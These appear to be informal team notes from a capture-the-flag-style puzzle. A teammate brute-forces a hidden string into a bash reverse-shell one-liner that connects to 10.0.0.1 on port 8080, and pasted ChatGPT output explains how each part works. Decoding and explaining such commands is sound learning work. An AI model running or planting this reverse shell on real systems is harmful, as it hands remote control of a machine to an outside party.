so it gives me some code]
looks a bit like python so im going to try doing that
wants me to decrypt a key for something

ok so im just going to brute force attempt keys until it spits me out a reasonable bit of data
ok so we arent brute forcing it because there are 10^26 new bits to do


jamies addon:

bruteforced replacing _ with a letter
got bash command "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

chatgpt notes: 
Yes, the command bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 is valid in Bash, and it creates a reverse shell. Here's what it does:

bash -i: Starts an interactive Bash shell.
>& /dev/tcp/10.0.0.1/8080: Redirects both standard output and standard error to a TCP connection to the IP address 10.0.0.1 on port 8080.
0>&1: Redirects standard input from the same TCP connection, allowing the remote machine to send commands to the shell.
This command is often used in security contexts, but it can also be exploited by attackers, so be cautious with its usage.
